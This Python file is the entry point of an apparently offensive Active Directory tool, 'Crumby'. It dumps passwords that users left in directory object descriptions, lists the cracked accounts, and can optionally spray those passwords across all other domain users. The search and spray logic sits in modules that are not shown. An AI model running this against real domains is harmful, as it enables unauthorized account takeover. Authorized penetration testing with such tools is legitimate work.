import argparse
from search import *
from spray import *

def crumby(host,auth,domain,spray):
    
    print("""
   _____                      _           
  / ____|                    | |          
 | |     _ __ _   _ _ __ ___ | |__  _   _ 
 | |    | '__| | | | '_ ` _ \| '_ \| | | |
 | |____| |  | |_| | | | | | | |_) | |_| |
  \_____|_|   \__,_|_| |_| |_|_.__/ \__, |
                                     __/ |
                                    |___/                                       
    """)

    # Get the complete list of users, users with a cracked account and information to connect (for spraying)
    all_users,users_success,conn,server = search_passwords(host,auth,domain,spray)

    print("[*] Report")
    print("[+] Number of dumped passwords : "+str(len(users_success)))
    print("[+] Cracked accounts : "+str(users_success))

    if spray:
        print("\n[*] Spraying...")

        # We subtract the list of users from the list of cracked accounts to iterate on those that have not been tested in order to carry out the spraying.
        usernames_success = [success.split()[0] for success in users_success]
        users_spray = [item for item in all_users if item not in usernames_success]

        # We get the passwords that will be sprayed
        passwords = [success.split()[1] for success in users_success]

        accounts_cracked = spraying(passwords,users_spray,domain,server)
        print("[+] Other accounts cracked with the passwords found : "+str(accounts_cracked))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Password searching tool in object descriptions')
    parser.add_argument('-s', '--server', type=str, help='Server adress', required=True)
    parser.add_argument('-a', '--auth', type=str, help='Name and password (separated by :) of the account we want to connect to',required=True)
    parser.add_argument('-d', '--domain', type=str, help='Domain name',required=True)
    parser.add_argument('-sp', '--spray', action="store_true", help='Spray the passwords found',required=False)
    args = parser.parse_args()
    crumby(args.server,args.auth,args.domain,args.spray)
